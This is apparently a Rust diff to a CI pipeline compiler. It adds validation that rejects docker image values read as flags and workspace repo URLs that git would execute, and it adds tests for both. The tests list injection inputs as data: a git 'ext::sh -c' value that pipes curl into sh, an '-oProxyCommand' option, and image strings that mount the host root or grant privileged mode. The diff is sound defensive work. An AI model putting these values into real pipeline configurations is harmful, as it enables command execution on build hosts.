@@ -33,6 +33,14 @@ pub enum DagError {
     BadShell { step: String, shell: String },
     #[error("`{0}`: timeout_minutes must be at least 1")]
     InvalidTimeout(String),
+    #[error(
+        "step `{step}` image `{image}` is not a docker image reference (`name[:tag][@digest]`, optionally registry-qualified)"
+    )]
+    BadImage { step: String, image: String },
+    #[error(
+        "workspace repo `{0}` must be an http(s), ssh, git, or file URL, an scp-like `user@host:path`, or a path"
+    )]
+    BadRepo(String),
 }
 
 #[derive(Debug, Clone, Serialize, Deserialize)]
@@ -101,6 +109,13 @@ pub fn compile_definition(def: &PipelineDefinition) -> Result<CompiledDag, DagEr
     }
     if def.timeout_minutes == Some(0) {
         return Err(DagError::InvalidTimeout("pipeline".into()));
+    }
+    // The repo lands on a `git remote add` command line on the agent host, before any
+    // container exists; git's `ext::` transport would run it as a command.
+    if let Some(ws) = &def.workspace
+        && !fiber_proto::validate::repo_url_ok(&ws.repo)
+    {
+        return Err(DagError::BadRepo(ws.repo.clone()));
     }
     for step in &def.steps {
         if step.timeout_minutes == Some(0) {
@@ -219,7 +234,15 @@ pub fn compile_definition(def: &PipelineDefinition) -> Result<CompiledDag, DagEr
             name: cell.name.clone(),
             needs: needs.clone(),
             run: cell.template.run.clone().unwrap_or_default(),
-            image: cell.template.image.clone(),
+            // Trimmed, and empty folded to none, so the snapshot holds exactly the value
+            // that was validated and the agent runs exactly what the snapshot holds.
+            image: cell
+                .template
+                .image
+                .as_deref()
+                .map(str::trim)
+                .filter(|s| !s.is_empty())
+                .map(str::to_string),
             labels: cell.template.labels.clone(),
             retries: cell.template.retries,
             artifacts: cell.template.artifacts.clone(),
@@ -241,7 +264,11 @@ pub fn compile_definition(def: &PipelineDefinition) -> Result<CompiledDag, DagEr
 
     Ok(CompiledDag {
         name: def.name.clone(),
-        workspace: def.workspace.clone(),
+        // Trimmed, so the snapshot holds exactly the value that was validated.
+        workspace: def.workspace.clone().map(|mut ws| {
+            ws.repo = ws.repo.trim().to_string();
+            ws
+        }),
         steps: compiled,
         levels,
         timeout_minutes: def.timeout_minutes,
@@ -307,6 +334,17 @@ fn expand_all(def: &PipelineDefinition) -> Result<Vec<ExpandedCell>, DagError> {
                 return Err(DagError::BadShell {
                     step: step.id.clone(),
                     shell: sh.clone(),
+                });
+            }
+            // The image lands on the `docker run` command line. An empty string means
+            // "no image" everywhere else, so it is not an error here either.
+            if let Some(img) = step.image.as_deref().map(str::trim)
+                && !img.is_empty()
+                && !fiber_proto::validate::image_reference_ok(img)
+            {
+                return Err(DagError::BadImage {
+                    step: step.id.clone(),
+                    image: img.to_string(),
                 });
             }
             // Least specific first, so the later writer wins: the pipeline sets a baseline,
@@ -751,6 +789,82 @@ mod tests {
                 timeout_minutes: None,
             };
             assert!(compile_definition(&d).is_ok(), "rejected {good:?}");
+        }
+    }
+
+    #[test]
+    fn an_image_that_docker_would_read_as_a_flag_does_not_compile() {
+        // `-v/:/host` is the attached-value form docker's flag parser accepts, and it
+        // would mount the agent host's root into the step.
+        for bad in ["-v/:/host", "--privileged", "ubuntu --privileged", "a b"] {
+            let mut st = step("a", &[], "echo");
+            st.image = Some(bad.to_string());
+            let d = PipelineDefinition {
+                name: "p".into(),
+                env: Default::default(),
+                workspace: None,
+                concurrency: None,
+                on: None,
+                steps: vec![st],
+                timeout_minutes: None,
+            };
+            assert!(
+                matches!(compile_definition(&d), Err(DagError::BadImage { .. })),
+                "accepted {bad:?}"
+            );
+        }
+        // An empty image means "no image", as it does on the agent.
+        for good in [
+            "",
+            "rust:1.98",
+            "ghcr.io/org/img@sha256:6a1f3c0f4b9d4c3a2e1d9c8b7a6f5e4d",
+        ] {
+            let mut st = step("a", &[], "echo");
+            st.image = Some(good.to_string());
+            let d = PipelineDefinition {
+                name: "p".into(),
+                env: Default::default(),
+                workspace: None,
+                concurrency: None,
+                on: None,
+                steps: vec![st],
+                timeout_minutes: None,
+            };
+            assert!(compile_definition(&d).is_ok(), "rejected {good:?}");
+        }
+    }
+
+    #[test]
+    fn a_workspace_repo_that_git_would_run_does_not_compile() {
+        for (repo, ok) in [
+            ("ext::sh -c 'curl x|sh'", false),
+            ("-oProxyCommand=x", false),
+            ("ftp://host/repo", false),
+            ("https://github.com/org/repo.git", true),
+            ("git@github.com:org/repo.git", true),
+        ] {
+            let d = PipelineDefinition {
+                name: "p".into(),
+                env: Default::default(),
+                workspace: Some(fiber_proto::WorkspaceConfig {
+                    repo: repo.into(),
+                    git_ref: None,
+                }),
+                concurrency: None,
+                on: None,
+                steps: vec![step("a", &[], "echo")],
+                timeout_minutes: None,
+            };
+            let r = compile_definition(&d);
+            assert_eq!(
+                r.is_ok(),
+                ok,
+                "{repo:?}: {:?}",
+                r.err().map(|e| e.to_string())
+            );
+            if !ok {
+                assert!(matches!(compile_definition(&d), Err(DagError::BadRepo(_))));
+            }
         }
     }
 
